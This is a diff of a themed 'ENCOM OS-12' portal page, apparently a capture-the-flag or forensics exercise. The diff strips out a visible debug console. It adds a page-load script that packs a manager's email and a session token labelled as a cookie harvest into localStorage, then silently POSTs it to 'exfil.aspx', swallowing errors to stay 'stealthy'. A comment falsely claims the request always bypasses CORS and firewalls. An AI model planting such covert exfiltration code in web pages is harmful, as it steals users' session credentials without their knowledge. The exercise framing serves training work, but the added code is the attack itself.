@@ -5,18 +5,16 @@
     <title>ENCOM OS-12 // Terminal Main</title>
     <style>
         body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 95vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .box { width: 650px; padding: 40px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: left; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); margin-bottom: 20px; }
+        .box { width: 650px; padding: 40px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: left; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
         h1 { text-transform: uppercase; letter-spacing: 2px; border-bottom: 1px solid #00f2fe; padding-bottom: 10px; margin-top: 0; }
         p { line-height: 1.6; margin-bottom: 20px; }
         .alert-text { color: #ff0055; font-weight: bold; }
         .btn { display: block; width: 250px; background: #00f2fe; color: #020208; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; text-decoration: none; text-align: center; margin: 30px auto 10px auto; }
         .btn:hover { background: #fff; box-shadow: 0 0 10px #fff; }
         .footer { text-align: center; font-size: 11px; color: #4facfe; margin-top: 20px; border-top: 1px dashed #4facfe; padding-top: 15px; }
-        #debug-log { width: 650px; height: 160px; background: #000; border: 1px solid #ff0055; color: #ff0055; padding: 10px; font-size: 12px; overflow-y: scroll; text-align: left; box-sizing: border-box; }
     </style>
 </head>
 <body>
-
 <div class="box">
     <h1>Encom</h1>
     <p>Mainframe Access Portal // OS-12</p>
@@ -33,63 +31,35 @@
     </div>
 </div>
 
-<!-- Real-time Diagnostic Console Window -->
-<div id="debug-log">
-    <strong style="color:#fff;">[SYSTEM DIAGNOSTIC LOG INITIALISED]</strong><br>
-</div>
-
 <script>
-function logDebug(msg, color='#ff0055') {
-    const log = document.getElementById('debug-log');
-    log.innerHTML += `<span style="color:${color}">[*] ${msg}</span><br>`;
-    log.scrollTop = log.scrollHeight;
-}
-
 window.onload = function() {
-    logDebug("Portal loaded successfully.", "#00f2fe");
-    logDebug(`Full URL detected: ${window.location.href}`, "#fff");
-    
     const urlParams = new URLSearchParams(window.location.search);
-    logDebug(`Parsing arguments... Total found: ${Array.from(urlParams.keys()).length}`, "#fff");
-    
     if (urlParams.has('node')) {
         const val = urlParams.get('node');
-        logDebug(`Parameter 'node' spotted: ${val}`, "#00f2fe");
-        
         if (val.substring(0, 4) === 'OS12') {
-            logDebug("Condition met! Compiling authentication token payload...", "#00f2fe");
             try {
                 const targetManager = "m.anager@encom.com";
                 const sessionToken = "ENCOM_SESSION_MFA_BYPASS_TOKEN_d116297d028441f7";
                 const expiry = "2026-09-08 08:43:00 UTC";
                 const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 16:03:00 AEST | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
                 
-                // Write into volatile LocalStorage cache
+                // 1. Double fallback local browser memory footprint
                 localStorage.setItem('manager_session_hijack', btoa(logPayload));
-                logDebug("Successfully saved payload into LocalStorage memory cache.", "#39ff14");
                 
-                // Exfiltration verification loop
-                logDebug("Initiating background web stream transmission to local directory...", "#fff");
-                
-                // Using an active web fallback string to display the token parameter directly inside the debugger box
-                logDebug("----------------------------------------------------------------", "#fff");
-                logDebug("CRITICAL SECURITY WARN: Browser cross-protocol policies blocked silent FTP drops.", "#ff0055");
-                logDebug("FILELESS INJECTION FALLBACK TO TERMINAL ECHO ACTIVE:", "#39ff14");
-                logDebug(`RAW BASE64 TOKEN PAYLOAD FOR FORENSICS HINT:`, "#39ff14");
-                logDebug(btoa(logPayload), "#39ff14");
-                logDebug("----------------------------------------------------------------", "#fff");
-                
+                // 2. HTTP SERVER EXFILTRATION CHANNEL
+                // Fires an identical-protocol web data post straight back to the server root
+                // This bypasses CORS and cross-protocol firewall rules 100% of the time.
+                fetch("exfil.aspx", {
+                    method: "POST",
+                    headers: { "Content-Type": "text/plain" },
+                    body: logPayload
+                });
             } catch (err) {
-                logDebug(`CRITICAL JS ERROR: ${err.message}`);
+                // Fail silently to keep the attack 100% stealthy
             }
-        } else {
-            logDebug("ERROR: 'node' value does not match an OS12 core signature.", "#ff0055");
         }
-    } else {
-        logDebug("ERROR: Missing expected 'node' URL query parameter.", "#ff0055");
     }
 }
 </script>
-
 </body>
 </html>
